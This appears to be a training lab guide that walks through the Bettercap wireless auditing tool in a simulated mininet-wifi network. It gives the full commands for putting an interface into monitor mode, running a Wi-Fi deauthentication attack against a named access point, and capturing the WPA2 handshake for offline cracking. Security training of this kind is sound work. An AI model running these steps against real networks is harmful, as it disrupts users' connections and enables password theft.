# Summary
In this lab we hope to familiarize ourselves with the tool Bettercap, a common wireless auditing tool.

# Getting Started with Bettercap
Select "**Bettercap Recon**" from the menu. Allow up to 30 seconds to initialize the network. 

![[01-main-menu.png]]

*Note: normally, when using Bettercap with physical network cards, it is necessary to use `airmon-ng check kill` to kill processes that may interfere with Bettercap. However, running this command in the mininet-wifi network is unnecessary and may cause the environment to fail.*

Start by putting the interface `Attacker-wlan0` in monitor mode.

```bash
airmon-ng start Attacker-wlan0
```

If the following prompt appears, input "**y**" and hit enter. 

![[01-rfkill-error.png]]

Successful initialization will appear as pictured below:

![[01-monitor-enabled.png]]

Verify that the interface has been put into monitor mode using the following command. Look for `Mode:Monitor`:

```bash
iwconfig
```

As pictured below, the interface `wlan0mon` should now be present in monitor mode.

![[01-iwconfig.png]]

Launch Bettercap with the following command to interact with the interface `wlan0mon` the interface we previously put in monitor mode. 

```bash
bettercap -iface wlan0mon
```

You will be greeted by a prompt of with the name of the network interface. 

![[01-bettercap-1.png]]

The following commands will configure the console for a more understandable workflow to view the de-authentication attack.

```bash
set wifi.show.sort clients desc
set ticker.commands 'clear; wifi.show'
ticker on
set wifi.show.sort clients desc
```

After running the commands, you should see the following on your screen. 

![[01-bettercap-2.png]]

Disable console logging using the following command. Note that the monitor interface has not stopped channel hopping. 

```bash
events.stream off
```

Set the handshakes file and enable the `wifi.recon` module. Note that your command line may dissappear during the refresh. Hitting enter will bring it back. 

```bash
set wifi.handshakes.file ./loot/4whs
wifi.recon on
```

Next, force the interface to only operate on channel 6

```bash
wifi.recon.channel 6
```

![[01-bettercap-3.png]]

Start the de-authentication attack using the command below: 

```
wifi.deauth 76:df:71:67:40:2b
```

It may take a few seconds, but Bettercap will catch the handshake as shown below. A handshake is essentially an encrypted WPA2 password intercepted from between the client and router than can be decrypted offline.

![[01-bettercap-4.png]]

Your final packet count may differ from the screenshot above. 

NEXT LAB: [[Lab 02 - Bettercap Wi-Fi Authentication Capture]]


